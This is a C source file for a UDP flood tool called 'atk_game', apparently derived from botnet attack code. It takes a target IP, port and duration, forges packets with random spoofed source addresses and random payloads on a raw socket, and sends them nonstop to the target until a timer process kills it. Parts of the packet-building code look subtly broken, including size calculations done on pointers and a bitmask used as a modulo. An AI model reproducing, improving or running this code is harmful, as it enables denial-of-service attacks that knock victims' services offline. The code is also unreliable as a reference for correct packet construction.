#include <time.h>
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <stdint.h>
#include <signal.h>
#include <unistd.h>
#include <sys/prctl.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>

#define MAX_PSIZE 500
#define MIN_PSIZE 100

#define INET_ADDR(o1, o2, o3, o4) (htonl((o1 << 24) | (o2 << 16) | (o3 << 8) | (o4 << 0)))

struct pseudo_header
{
	u_int32_t source_address;
	u_int32_t dest_address;
	u_int8_t placeholder;
	u_int8_t protocol;
	u_int16_t udp_length;
};


static uint32_t x, y, z, w;

void rand_init(void)
{
    x = time(NULL);
    y = getpid() ^ getppid();
    z = clock();
    w = z ^ y;
}

uint32_t rand_next(void) //period 2^96-1
{
    uint32_t t = x;
    t ^= t << 11;
    t ^= t >> 8;
    x = y; y = z; z = w;
    w ^= w >> 19;
    w ^= t;
    return w;
}

void rand_str(char *str, int len) // Generate random buffer (not alphanumeric!) of length len
{
    while (len > 0)
    {
        if (len >= 4)
        {
            *((uint32_t *)str) = rand_next();
            str += sizeof (uint32_t);
            len -= sizeof (uint32_t);
        }
        else if (len >= 2)
        {
            *((uint16_t *)str) = rand_next() & 0xFFFF;
            str += sizeof (uint16_t);
            len -= sizeof (uint16_t);
        }
        else
        {
            *str++ = rand_next() & 0xFF;
            len--;
        }
    }
}

void rand_alphastr(uint8_t *str, int len) // Random alphanumeric string, more expensive than rand_str
{
    const char alphaset[] = "abcdefghijklmnopqrstuvw012345678";

    while (len > 0)
    {
        if (len >= sizeof (uint32_t))
        {
            int i;
            uint32_t entropy = rand_next();

            for (i = 0; i < sizeof (uint32_t); i++)
            {
                uint8_t tmp = entropy & 0xff;

                entropy = entropy >> 8;
                tmp = tmp >> 3;

                *str++ = alphaset[tmp];
            }
            len -= sizeof (uint32_t);
        }
        else
        {
            *str++ = rand_next() % (sizeof (alphaset));
            len--;
        }
    }
}

static int random_int(int nMin, int nMax) {
    return rand_next() & ((nMax + 1) - nMin) + nMin;
}

static in_addr_t get_random_ip(void)
{
    uint32_t tmp;
    uint8_t o1, o2, o3, o4;


    tmp = rand_next();

    o1 = tmp & 0xff;
    o2 = (tmp >> 8) & 0xff;
    o3 = (tmp >> 16) & 0xff;
    o4 = (tmp >> 24) & 0xff;
    
    return INET_ADDR(o1,o2,o3,o4);
}


static void watch(int seconds) {
    if(!fork()) {
        prctl(PR_SET_PDEATHSIG, SIGTERM);
        sleep(seconds);

        kill(getppid(), 9);
    }
}

static uint16_t checksum_generic(uint16_t *addr, uint32_t count) {
    register unsigned long sum = 0;

    for (sum = 0; count > 1; count -= 2)
        sum += *addr++;
    if (count == 1)
        sum += (char)*addr;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    
    return ~sum;
}

static uint16_t checksum_tcpudp(struct iphdr *iph, void *buff, uint16_t data_len, int len) {
    const uint16_t *buf = buff;
    uint32_t ip_src = iph->saddr;
    uint32_t ip_dst = iph->daddr;
    uint32_t sum = 0;
    
    while (len > 1)
    {
        sum += *buf;
        buf++;
        len -= 2;
    }

    if (len == 1)
        sum += *((uint8_t *) buf);

    sum += (ip_src >> 16) & 0xFFFF;
    sum += ip_src & 0xFFFF;
    sum += (ip_dst >> 16) & 0xFFFF;
    sum += ip_dst & 0xFFFF;
    sum += htons(iph->protocol);
    sum += data_len;

    while (sum >> 16) 
        sum = (sum & 0xFFFF) + (sum >> 16);

    return ((uint16_t) (~sum));
}

unsigned short csum(unsigned short *ptr,int nbytes) 
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;
	
	return(answer);
}


static void calc_checksum(struct iphdr *iph, struct udphdr *udph, char *data) {
    struct pseudo_header psh;
    int len = sizeof(struct pseudo_header) + sizeof(struct udphdr) + strlen(data);
    char *pseudogram = malloc(len);
    
    psh.source_address = iph->saddr;
	psh.dest_address = iph->daddr;
    
	psh.placeholder = 0;
	psh.protocol = IPPROTO_UDP;

	psh.udp_length = htons(sizeof(struct udphdr) + strlen(data));

    memcpy(pseudogram, (char *)&psh , sizeof (struct pseudo_header));
	memcpy(pseudogram + sizeof(struct pseudo_header), udph, sizeof(struct udphdr) + strlen(data));

    udph->check = 0;
    udph->check = csum((unsigned short *)pseudogram, len);
}


static void remake_packet(struct iphdr *iph, struct udphdr *udph) {
    char buf[MAX_PSIZE];
    int psize = random_int(MIN_PSIZE, MAX_PSIZE);

    memset(buf, 0, MAX_PSIZE);

    rand_alphastr((uint8_t *)buf, psize);
    memcpy((void *)udph, buf, psize);
    
    iph->saddr = get_random_ip();
    iph->tot_len = sizeof(iph) + sizeof(udph) + psize;

    iph->check = 0;
    iph->check = checksum_generic((uint16_t *)iph, iph->tot_len);

    calc_checksum(iph, udph, buf);

    udph->source = (rand_next() & 65536) + 1;
}

static void atk_game(in_addr_t host, uint16_t port, int seconds) {
    int sock;
    if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1)
        return;
    if(setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &(int){1}, sizeof(int)) < 0)
        return;

    char *rdbuf = calloc(1, 4096);
    
    struct iphdr *iph = (struct iphdr *)rdbuf;
    struct udphdr *udph = (struct udphdr *) (rdbuf + sizeof(iph));

    struct sockaddr_in addr = {
        .sin_addr.s_addr = host,
        .sin_port = htons(port),
        .sin_family = AF_INET
    };

    iph->daddr = addr.sin_addr.s_addr;

    iph->ttl = 128;
    iph->version = 4;
    iph->protocol = IPPROTO_UDP;
    iph->ihl = 5;
    iph->tos = 0;
    iph->frag_off = 0;
    iph->id = htonl(54321);

    udph->len = htons(sizeof(struct udphdr) + sizeof(rdbuf));
    udph->dest = addr.sin_port;

    size_t a_size = sizeof(addr);

    watch(seconds);

    while(1) {
        remake_packet(iph, udph);

        sendto(sock, rdbuf, iph->tot_len, MSG_NOSIGNAL, (struct sockaddr *)&addr, a_size);
    }
}

int main(int argc, char **argv) {
    if(argc != 4) {
        printf("invalid args!\r\n%s [ip] [port] [time]\r\n", argv[0]);

        return -1;
    }

    rand_init();

    atk_game(inet_addr(argv[1]), (uint16_t)atoi(argv[2]), atoi(argv[3]));
}
